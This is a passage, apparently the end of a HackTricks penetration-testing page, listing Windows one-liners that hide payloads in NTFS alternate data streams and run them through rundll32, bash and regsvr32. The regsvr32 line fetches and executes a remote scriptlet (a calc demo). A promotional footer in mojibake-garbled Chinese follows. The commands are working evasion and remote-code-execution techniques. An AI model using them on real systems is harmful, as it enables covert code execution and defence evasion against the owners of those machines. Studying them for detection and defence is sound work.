rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* bash.exe
echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh
bash.exe -c $(fakefile.txt:payload.sh)
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* Regsvr32
type c:\Windows\System32\scrobj.dll > Textfile.txt:LoveADS
regsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
